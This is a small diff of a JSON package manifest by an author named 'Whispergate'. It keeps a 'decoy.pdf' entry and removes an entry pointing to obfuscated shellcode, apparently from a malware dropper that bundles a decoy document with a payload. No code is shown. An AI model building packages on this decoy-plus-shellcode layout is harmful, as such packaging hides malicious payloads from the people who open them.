@@ -5,7 +5,6 @@
   "version": "1.0.0",
   "author": "Whispergate",
   "files": {
-    "decoy.pdf": "decoys/decoy.pdf",
-    "shellcode.bin": "shellcode/obfuscated.bin"
+    "decoy.pdf": "decoys/decoy.pdf"
   }
 }
